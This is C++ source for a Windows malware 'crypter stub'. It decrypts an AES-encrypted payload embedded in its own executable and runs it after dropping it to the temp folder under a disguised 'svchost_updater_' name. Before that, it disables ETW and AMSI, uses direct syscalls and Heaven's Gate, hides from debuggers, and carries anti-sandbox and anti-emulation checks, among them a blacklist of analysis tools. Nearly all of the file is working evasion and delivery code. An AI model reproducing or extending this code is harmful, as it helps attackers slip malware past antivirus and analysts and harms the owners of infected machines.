/*
 * Crypter Stub - Runtime Decryptor
 * Decrypts payload in memory and executes via RunPE
 *
 * Advanced Crypter Project
 *
 * Build: g++ stub.cpp -o stub.exe -mwindows -static -O2 -s
 */

#define _WIN32_WINNT 0x0600
#define WINVER 0x0600

#include "aes.h"
#include "evasion.h"
#include "heavensgate.h"
#include "polymorph.h"
#include "syscalls.h"
#include <cstdio>
#include <intrin.h>
#include <string>
#include <tlhelp32.h>
#include <windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

// ==================== EMBEDDED DATA MARKERS ====================
// These will be replaced by crypter.exe with actual encrypted data
// Format: [MARKER][SIZE:4bytes][DATA...]

#define PAYLOAD_MARKER "##ENCRYPTED_PAYLOAD##"
#define KEY_MARKER "##AES_KEY_DATA##"
#define IV_MARKER "##AES_IV_DATA##"
#define SIZE_MARKER "##PAYLOAD_SIZE##"
#define POLY_MARKER "##POLYMORPHIC##"

// Stub data section - crypter will write here
#pragma section(".stub", read, write)
__declspec(allocate(
    ".stub")) volatile unsigned char g_stubData[1024 * 1024 * 10] = {
    0}; // 10MB max payload

// ==================== ANTI-EMULATION LAYER ====================

// 1. CPUID Timing Check
bool AntiEmu_TimingCheck() {
  DWORD start = GetTickCount();

  // CPUID instruction (expensive on VMs/emulators)
  int cpuInfo[4];
  for (int i = 0; i < 100; i++) {
    __cpuid(cpuInfo, 0);
  }

  DWORD elapsed = GetTickCount() - start;

  // Real hardware: ~0-5ms
  // Emulator: much higher or artificially low (hooked)
  if (elapsed > 50 || elapsed == 0) {
    return true; // Emulator detected
  }

  return false;
}

// 2. Memory Allocation Pattern Check
bool AntiEmu_MemoryCheck() {
  // Allocate memory and check if it's actually usable
  LPVOID mem =
      VirtualAlloc(NULL, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!mem)
    return true;

  // Write pattern
  DWORD pattern = 0xDEADBEEF;
  memcpy(mem, &pattern, sizeof(pattern));

  // Read back
  DWORD readBack = *(DWORD *)mem;

  VirtualFree(mem, 0, MEM_RELEASE);

  if (readBack != pattern)
    return true;

  return false;
}

// 3. NtDelayExecution Hook Detection
typedef NTSTATUS(NTAPI *pNtDelayExecution)(BOOLEAN Alertable,
                                           PLARGE_INTEGER DelayInterval);

bool AntiEmu_SleepSkipCheck() {
  HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
  if (!hNtdll)
    return true;

  pNtDelayExecution NtDelayExecution =
      (pNtDelayExecution)GetProcAddress(hNtdll, "NtDelayExecution");
  if (!NtDelayExecution)
    return true;

  // Check if function is hooked (first bytes should be mov rax, ...)
  BYTE *funcPtr = (BYTE *)NtDelayExecution;
  if (funcPtr[0] == 0xE9 || funcPtr[0] == 0xEB) {
    // JMP instruction at start = hooked
    return true;
  }

  // Actual sleep test
  DWORD start = GetTickCount();
  Sleep(500);
  DWORD elapsed = GetTickCount() - start;

  // Should be at least 400ms
  if (elapsed < 400)
    return true; // Sleep was skipped

  return false;
}

// 4. Hardware Fingerprinting
bool AntiEmu_HardwareCheck() {
  SYSTEM_INFO si;
  GetSystemInfo(&si);

  // Less than 2 processors = VM/sandbox
  if (si.dwNumberOfProcessors < 2)
    return true;

  // Memory check
  MEMORYSTATUSEX memStatus;
  memStatus.dwLength = sizeof(memStatus);
  GlobalMemoryStatusEx(&memStatus);

  // Less than 4GB RAM = VM/sandbox
  if (memStatus.ullTotalPhys < 4ULL * 1024 * 1024 * 1024)
    return true;

  // Disk check - at least 60GB
  ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;
  if (GetDiskFreeSpaceExA("C:\\", &freeBytesAvailable, &totalBytes,
                          &totalFreeBytes)) {
    if (totalBytes.QuadPart < 60ULL * 1024 * 1024 * 1024)
      return true;
  }

  return false;
}

// 5. Process Enumeration Check (look for analysis tools)
bool AntiEmu_ProcessCheck() {
  const char *blacklist[] = {"x64dbg.exe",       "x32dbg.exe",
                             "ollydbg.exe",      "ida.exe",
                             "ida64.exe",        "procmon.exe",
                             "procmon64.exe",    "procexp.exe",
                             "procexp64.exe",    "wireshark.exe",
                             "fiddler.exe",      "charles.exe",
                             "vboxservice.exe",  "vmtoolsd.exe",
                             "vmwaretray.exe",   "sandboxiedcomlaunch.exe",
                             "joeboxserver.exe", "joeboxcontrol.exe",
                             "prl_tools.exe",    "vpcmap.exe",
                             "vmsrvc.exe",       "pestudio.exe",
                             "die.exe",          "lordpe.exe",
                             "pe-bear.exe"};

  HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hSnap == INVALID_HANDLE_VALUE)
    return true;

  PROCESSENTRY32 pe;
  pe.dwSize = sizeof(pe);

  bool found = false;
  if (Process32First(hSnap, &pe)) {
    do {
      for (int i = 0; i < sizeof(blacklist) / sizeof(blacklist[0]); i++) {
        if (_stricmp(pe.szExeFile, blacklist[i]) == 0) {
          found = true;
          break;
        }
      }
      if (found)
        break;
    } while (Process32Next(hSnap, &pe));
  }

  CloseHandle(hSnap);
  return found;
}

// 6. Registry-based VM Detection
bool AntiEmu_RegistryCheck() {
  HKEY hKey;

  // VMware
  if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools",
                    0, KEY_READ, &hKey) == ERROR_SUCCESS) {
    RegCloseKey(hKey);
    return true;
  }

  // VirtualBox
  if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                    "SOFTWARE\\Oracle\\VirtualBox Guest Additions", 0, KEY_READ,
                    &hKey) == ERROR_SUCCESS) {
    RegCloseKey(hKey);
    return true;
  }

  // Sandboxie
  if (RegOpenKeyExA(
          HKEY_LOCAL_MACHINE,
          "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Sandboxie",
          0, KEY_READ, &hKey) == ERROR_SUCCESS) {
    RegCloseKey(hKey);
    return true;
  }

  return false;
}

// 7. User Interaction Check
bool AntiEmu_UserInteractionCheck() {
  POINT pt1, pt2;
  GetCursorPos(&pt1);

  // Wait and check mouse movement
  Sleep(300);
  GetCursorPos(&pt2);

  bool mouseMoved = (pt1.x != pt2.x || pt1.y != pt2.y);

  // Check recent user input
  LASTINPUTINFO lii;
  lii.cbSize = sizeof(lii);
  GetLastInputInfo(&lii);

  DWORD idleTime = GetTickCount() - lii.dwTime;

  // No mouse movement in 300ms AND idle for more than 10 minutes = suspicious
  if (!mouseMoved && idleTime > 600000) {
    return true;
  }

  return false;
}

// Master Anti-Emulation Function
bool PerformAntiEmulationChecks() {
  // Random delay first
  Sleep(100 + (rand() % 500));

  // Run checks with weighted scoring
  int score = 0;

  if (AntiEmu_TimingCheck())
    score += 3;
  if (AntiEmu_MemoryCheck())
    score += 2;
  if (AntiEmu_SleepSkipCheck())
    score += 3;
  if (AntiEmu_HardwareCheck())
    score += 2;
  if (AntiEmu_ProcessCheck())
    score += 5;
  if (AntiEmu_RegistryCheck())
    score += 4;
  if (AntiEmu_UserInteractionCheck())
    score += 1;

  // Threshold: if score >= 5, likely emulator/sandbox
  return score >= 5;
}

// ==================== PE PARSER ====================

typedef struct {
  BYTE *data;
  DWORD size;
  PIMAGE_DOS_HEADER dosHeader;
  PIMAGE_NT_HEADERS ntHeaders;
  PIMAGE_SECTION_HEADER sections;
} PE_INFO;

bool ParsePE(BYTE *data, DWORD size, PE_INFO *peInfo) {
  if (size < sizeof(IMAGE_DOS_HEADER))
    return false;

  peInfo->data = data;
  peInfo->size = size;
  peInfo->dosHeader = (PIMAGE_DOS_HEADER)data;

  if (peInfo->dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    return false;

  peInfo->ntHeaders = (PIMAGE_NT_HEADERS)(data + peInfo->dosHeader->e_lfanew);

  if (peInfo->ntHeaders->Signature != IMAGE_NT_SIGNATURE)
    return false;

  peInfo->sections = IMAGE_FIRST_SECTION(peInfo->ntHeaders);

  return true;
}

// ==================== RUNPE / MEMORY EXECUTION ====================

typedef NTSTATUS(NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

bool RunPE(BYTE *payload, DWORD payloadSize) {
  // Drop & Execute Method (More reliable than Process Hollowing)

  char tempPath[MAX_PATH];
  GetTempPathA(MAX_PATH, tempPath);

  // Generate random filename
  srand(GetTickCount());
  char filename[MAX_PATH];
  sprintf(filename, "%s%s%d.exe", tempPath, "svchost_updater_", rand() % 99999);

  // Write payload to disk
  HANDLE hFile = CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                             FILE_ATTRIBUTE_NORMAL, NULL);
  if (hFile == INVALID_HANDLE_VALUE) {
    return false;
  }

  DWORD bytesWritten;
  if (!WriteFile(hFile, payload, payloadSize, &bytesWritten, NULL)) {
    CloseHandle(hFile);
    return false;
  }
  CloseHandle(hFile);

  // Execute payload
  STARTUPINFOA si = {sizeof(si)};
  PROCESS_INFORMATION pi;

  if (!CreateProcessA(filename, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si,
                      &pi)) {
    return false;
  }

  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);

  return true;
}

// ==================== KEY/IV EXTRACTION ====================
// Keys are XOR-obfuscated in the binary

const char *XOR_STUB_KEY = "STUB_CRYPT_2025_ADV";

bool ExtractKeyAndIV(BYTE *key, BYTE *iv, BYTE **encryptedPayload,
                     DWORD *payloadSize) {
  // Find markers in our own executable
  char selfPath[MAX_PATH];
  GetModuleFileNameA(NULL, selfPath, MAX_PATH);

  HANDLE hFile = CreateFileA(selfPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                             OPEN_EXISTING, 0, NULL);
  if (hFile == INVALID_HANDLE_VALUE) {
    // MessageBoxA(NULL, "Failed to open self file!", "DEBUG - Extract",
    //             MB_ICONERROR);
    return false;
  }

  DWORD fileSize = GetFileSize(hFile, NULL);
  if (fileSize == 0 || fileSize == INVALID_FILE_SIZE) {
    // MessageBoxA(NULL, "File size is 0 or Invalid!", "DEBUG - Extract",
    //             MB_ICONERROR);
    CloseHandle(hFile);
    return false;
  }

  // MessageBoxA(NULL, "Allocating memory...", "DEBUG", MB_OK);
  BYTE *fileData = new (std::nothrow) BYTE[fileSize];
  if (!fileData) {
    // MessageBoxA(NULL, "Memory allocation failed!", "DEBUG - Extract",
    //             MB_ICONERROR);
    CloseHandle(hFile);
    return false;
  }

  DWORD bytesRead;
  if (!ReadFile(hFile, fileData, fileSize, &bytesRead, NULL)) {
    // MessageBoxA(NULL, "ReadFile failed!", "DEBUG - Extract", MB_ICONERROR);
    delete[] fileData;
    CloseHandle(hFile);
    return false;
  }
  CloseHandle(hFile);

  // Search for markers
  // MessageBoxA(NULL, "Searching markers...", "DEBUG", MB_OK);
  std::string fileStr((char *)fileData, fileSize);

  // Find key marker
  size_t keyPos = fileStr.rfind(KEY_MARKER);
  if (keyPos == std::string::npos) {
    // MessageBoxA(NULL, "Key marker not found!", "DEBUG - Extract",
    // MB_ICONERROR);
    delete[] fileData;
    return false;
  }
  keyPos += strlen(KEY_MARKER);
  if (keyPos + AES_KEY_SIZE > fileSize) {
    // MessageBoxA(NULL, "Key past EOF!", "DEBUG - Extract", MB_ICONERROR);
    delete[] fileData;
    return false;
  }
  memcpy(key, fileData + keyPos, AES_KEY_SIZE);

  // Deobfuscate key
  XOR_Obfuscate(key, AES_KEY_SIZE, XOR_STUB_KEY);

  // Find IV marker
  size_t ivPos = fileStr.rfind(IV_MARKER);
  if (ivPos == std::string::npos) {
    // MessageBoxA(NULL, "IV marker not found!", "DEBUG - Extract",
    // MB_ICONERROR);
    delete[] fileData;
    return false;
  }
  ivPos += strlen(IV_MARKER);
  memcpy(iv, fileData + ivPos, AES_IV_SIZE);

  // Deobfuscate IV
  XOR_Obfuscate(iv, AES_IV_SIZE, XOR_STUB_KEY);

  // Find size marker
  size_t sizePos = fileStr.rfind(SIZE_MARKER);
  if (sizePos == std::string::npos) {
    // MessageBoxA(NULL, "Size marker not found!", "DEBUG - Extract",
    //             MB_ICONERROR);
    delete[] fileData;
    return false;
  }
  sizePos += strlen(SIZE_MARKER);
  *payloadSize = *(DWORD *)(fileData + sizePos);

  // Debug size (disabled for production)
  // char msg[100];
  // sprintf(msg, "Read Size: %lu\nFile Size: %lu\nOffset: %lu", *payloadSize,
  //         fileSize, (unsigned long)sizePos);
  // MessageBoxA(NULL, msg, "DEBUG", MB_OK);

  // Find payload marker
  size_t payloadPos = fileStr.rfind(PAYLOAD_MARKER);
  if (payloadPos == std::string::npos) {
    // MessageBoxA(NULL, "Payload marker not found!", "DEBUG - Extract",
    //             MB_ICONERROR);
    delete[] fileData;
    return false;
  }
  payloadPos += strlen(PAYLOAD_MARKER);

  if (payloadPos + *payloadSize > fileSize) {
    // MessageBoxA(NULL, "Payload past EOF!", "DEBUG - Extract", MB_ICONERROR);
    delete[] fileData;
    return false;
  }

  *encryptedPayload = new (std::nothrow) BYTE[*payloadSize];
  if (!*encryptedPayload) {
    // MessageBoxA(NULL, "Payload alloc failed!", "DEBUG - Extract",
    // MB_ICONERROR);
    delete[] fileData;
    return false;
  }
  memcpy(*encryptedPayload, fileData + payloadPos, *payloadSize);

  delete[] fileData;
  return true;
}

// ==================== MAIN ENTRY ====================

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {
  // ==================== EVASION INITIALIZATION ====================
  // 1. Disable ETW (Event Tracing for Windows)
  DisableETW();
  DisableNtTraceEvent();

  // 2. Disable AMSI (Antimalware Scan Interface)
  DisableAMSI();

  // 3. Initialize Direct Syscalls (bypass ntdll hooks)
  InitializeSyscallStubs();

// 4. Initialize Heaven's Gate (x86 only - x64 code from x86 process)
#ifndef _WIN64
  InitializeHeavensGate();
#endif

  // 5. Hide from debugger
  HideThreadFromDebugger();

  // 6. Check for hardware breakpoints / debugger
  // if (HasHardwareBreakpoints() || IsBeingDebugged_NtGlobalFlag()) {
  //    return 0;
  // }

  // ==================== ORIGINAL STUB CODE ====================
  // Junk code for static analysis confusion
  volatile int junk = 0;
  for (int i = 0; i < 50; i++) {
    junk += i * 3;
    junk ^= 0xAA;
  }
  if (junk == 123456789)
    return 0; // Never happens

  // Random startup delay (1-3 seconds)
  srand((unsigned)GetTickCount());
  Sleep(1000 + (rand() % 2000));

  // Anti-emulation checks (DISABLED FOR DEBUG)
  // if (PerformAntiEmulationChecks()) {
  //    // Detected sandbox/emulator - exit silently
  //    return 0;
  // }

  // MessageBoxA(NULL, "Stub checks passed. Extracting...", "DEBUG", MB_OK);

  // Additional delay after passing checks
  Sleep(500 + (rand() % 1000));

  // Extract embedded cryptographic material
  BYTE key[AES_KEY_SIZE];
  BYTE iv[AES_IV_SIZE];
  BYTE *encryptedPayload = NULL;
  DWORD encryptedSize = 0;

  if (!ExtractKeyAndIV(key, iv, &encryptedPayload, &encryptedSize)) {
    // MessageBoxA(NULL, "Extraction failed!", "DEBUG", MB_ICONERROR);
    return 0; // Extraction failed
  }

  // MessageBoxA(NULL, "Extracted. Decrypting...", "DEBUG", MB_OK);

  // Decrypt payload
  std::vector<BYTE> decryptedPayload;
  if (!AES_Decrypt(encryptedPayload, encryptedSize, key, iv,
                   decryptedPayload)) {
    // Fallback to RC4
    // MessageBoxA(NULL, "AES failed, using RC4...", "DEBUG", MB_OK);
    RC4_Crypt(encryptedPayload, encryptedSize, key, AES_KEY_SIZE);
    decryptedPayload.assign(encryptedPayload, encryptedPayload + encryptedSize);
  }

  // MessageBoxA(NULL, "Decrypted. Executing...", "DEBUG", MB_OK);

  // Secure cleanup of sensitive data
  SecureZeroMemory(key, sizeof(key));
  SecureZeroMemory(iv, sizeof(iv));
  delete[] encryptedPayload;

  // Execute decrypted payload via RunPE
  if (!RunPE(decryptedPayload.data(), (DWORD)decryptedPayload.size())) {
    // MessageBoxA(NULL, "Execution FAILED!", "DEBUG", MB_ICONERROR);
    return 0;
  }

  // MessageBoxA(NULL, "Execution SUCCESS!", "DEBUG", MB_OK);

  // Secure cleanup
  SecureZeroMemory(decryptedPayload.data(), decryptedPayload.size());

  return 0;
}
